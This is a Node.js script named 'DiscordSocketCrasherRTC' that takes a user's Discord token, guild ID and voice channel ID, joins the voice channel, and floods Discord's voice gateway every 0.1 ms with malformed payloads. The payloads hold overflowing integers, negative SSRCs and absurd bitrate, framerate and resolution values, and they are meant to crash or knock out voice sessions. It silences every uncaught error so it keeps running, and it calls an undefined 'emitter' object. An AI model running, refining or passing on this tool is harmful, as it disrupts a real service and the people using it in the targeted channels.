const WebSocket = require('ws').WebSocket;
const readline = require('readline');

var Sequence = 0;
var SessionID = 0;
var SessionToken = ''
var UserId = 0;
var ChannelId = 0;
var ServerId = 0;
var Token = ''
var MediaEndpoint = ''
const os = require('os');
const platform = os.platform();

console.clear()
console.log("          .                      .")
console.log("          .                      ;")
console.log("          :                  - --+- -")
console.log("          !           .          !")
console.log("          |        .             .")
console.log("          |_         +")
console.log("       ,  | `.")
console.log(" --- --+-<#>-+- ---  --  -")
console.log("       `._|_,'")
console.log("          T")
console.log("          |")
console.log("          !")
console.log("          :         . : ")
console.log("          .       *")
console.log("")
console.log("[ DEBUG ] Starting DiscordSocketCrasherRTC");

if (platform === 'win32') {
    console.log('[ DEBUG ] Windows detected');
}
else if (platform === 'linux') {
    console.log('[ DEBUG ] Linux detected');
}
else if (platform === 'darwin') {
    console.log('[ DEBUG ] MacOS detected');
}
else {
    console.log('[ ERROR ] Unknown operating system detected');
};
console.log("")
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('outage(token)    > ', (token) => {
    Token = token;
    rl.question('outage(guild-id) > ', (guildid) => {
        ServerId = guildid;
        rl.question('outage(voice-id) > ', (voicechannelid) => {
            ChannelId = voicechannelid;
            commence();
        });
    });
});

process.on('uncaughtException', function(err) { });

function commence() {
    const WS = new WebSocket("wss://gateway.discord.gg/?v=10&encoding=json");

    WS.on('open', () => { });

    WS.on('message', (msg) => {
        var message = JSON.parse(msg.toString());
        switch(message.op) {
            case 0:
                var event = message.t;
                switch(event) {
                    case "READY":
                        SessionID = message.d.session_id;
                        UserId = message.d.user.id;
    
                        WS.send(JSON.stringify({
                            op: 4,
                            d: {
                                guild_id: ServerId,
                                channel_id: ChannelId,
                                self_mute: false,
                                self_deaf: false
                            }
                        }));
                    break;
                    
                    case "VOICE_SERVER_UPDATE":

                        SessionToken = message.d.token;
                        MediaEndpoint = message.d.endpoint;
                        
                        var socket = new WebSocket(`wss://${MediaEndpoint.replace('.discord.gg:443', '.discord.media')}/?v=6`);

                        console.log(" ");
                        console.log("debug(session-token) > " + SessionToken);
                        console.log("debug(endpoint)      > " + MediaEndpoint);
                        console.log("debug(sequence)      > " + Sequence);
                        console.log("debug(heartbeat)     > " + socket.heartbeat);
                        console.log("debug(opened)        > " + socket.readyState);
                        console.log("debug(session-id)    > " + SessionID);
                        console.log("debug(user-id)       > " + UserId);
                        console.log("debug(server-id)     > " + ServerId);
                        console.log("debug(channel-id)    > " + ChannelId);
                        console.log(" ");
                        emitter.setMaxListeners(10000);
                        
                        setInterval(() => {

                            try {
                                socket.on('open', () => {
                                    socket.send(JSON.stringify({"op":0,"d":{"server_id":ServerId,"user_id":UserId,"session_id":SessionID,"token":SessionToken,"video":true,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}}));
                                    socket.send(JSON.stringify({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":true,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}}))
                                    socket.send(JSON.stringify({"op":5,"d":{"speaking":323453454353453451,"delay":-1,"ssrc":9223372036854775807}}));
                                    socket.send(JSON.stringify({"op":3,"d":-1}));
                                    socket.send(JSON.stringify({"op":16,"d":{}}));
                                    socket.close();
                                })
                            }
                            catch { }
                        }, 0.1);
                    break;
                }
            break;
            case 10:
                var interval = message.d.heartbeat_interval;
    
                setInterval(() => {
                    WS.send(JSON.stringify({
                        op: 1,
                        d: Sequence
                    }));
                }, interval);
    
                WS.send(JSON.stringify({
                    op: 2,
                    d: {
                        token: Token,
                        properties: {
                            browser: "Discord Android",
                            os: "Android"
                        }
                    }
                }));
            break;
        }
    });
}
